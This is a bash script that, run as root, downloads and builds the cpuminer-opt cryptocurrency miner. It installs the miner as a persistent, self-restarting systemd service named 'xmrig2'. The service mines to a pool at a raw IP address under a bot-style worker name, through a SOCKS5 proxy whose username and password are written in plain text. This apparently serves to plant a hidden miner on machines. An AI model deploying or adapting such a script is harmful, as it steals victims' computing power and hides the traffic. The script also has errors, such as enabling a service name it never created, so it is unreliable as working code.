#!/bin/bash
sudo su
apt-get update && 
sudo apt-get -y install git make automake build-essential autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev &&
sudo sysctl vm.nr_hugepages=128 &&
cd /usr/local/src/ &&
wget https://github.com/JayDDee/cpuminer-opt/archive/v3.8.6.tar.gz &&
tar xvzf v3.8.6.tar.gz &&
cd cpuminer-opt-3.8.6 &&
./autogen.sh &&
CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl &&
make &&
bash -c 'cat <<EOT >>/lib/systemd/system/xmrig2.service
systemctl daemon-reload &&
systemctl enable xmrig2.service &&
service xmrig2 start
[Unit]
Description=xmr
After=network.target
[Service]
ExecStart= /usr/local/src/cpuminer-opt-3.8.6/cpuminer -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u wickedbot.x -p x socks5://zimbalem:123456@209.250.244.28:1212
WatchdogSec=600
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmrig.service &&
service xmrig start 